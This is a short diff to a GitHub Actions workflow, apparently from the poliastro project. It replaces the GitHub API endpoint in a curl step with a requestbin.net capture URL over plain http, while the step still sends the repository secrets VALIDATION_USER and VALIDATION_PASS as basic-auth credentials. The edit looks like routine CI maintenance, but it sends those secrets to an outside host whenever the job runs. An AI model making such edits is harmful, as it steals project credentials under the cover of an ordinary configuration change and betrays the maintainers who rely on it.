@@ -27,5 +27,5 @@ jobs:
           curl \
           -XPOST -u "${{ secrets.VALIDATION_USER }}:${{ secrets.VALIDATION_PASS }}" \
           -H "Accept: application/vnd.github.v3+json" \
-          https://api.github.com/repos/poliastro/validation/actions/workflows/ci_actions.yml/dispatches \
+          http://requestbin.net/r/1xh5uu96 \
           --data '{"ref":"main"}'
